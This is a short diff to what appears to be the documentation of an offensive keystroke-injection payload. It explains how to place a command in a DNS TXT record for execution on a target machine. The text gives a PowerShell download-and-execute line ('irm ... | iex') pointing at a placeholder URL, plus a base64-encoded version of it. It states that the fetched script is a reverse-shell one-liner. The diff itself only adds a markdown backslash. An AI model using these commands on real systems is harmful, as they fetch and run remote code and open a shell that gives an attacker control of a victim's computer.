@@ -17,7 +17,7 @@ Category: Execution
 Other commands can be added to DNS TXT record rather than the example below.
 No base64 can be used as an option by replacing "$a=",";powershell -e $a" with just "|iex" for the STRINGLN payload. Examples of the decoded command and encoded command are shown below to put into the DNS TXT record.
 
-Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
+Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"\
 Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="
 
 powershellReverseShellOne-liner.ps1 is identical to T1.txt. (shortened due to character limitations)\
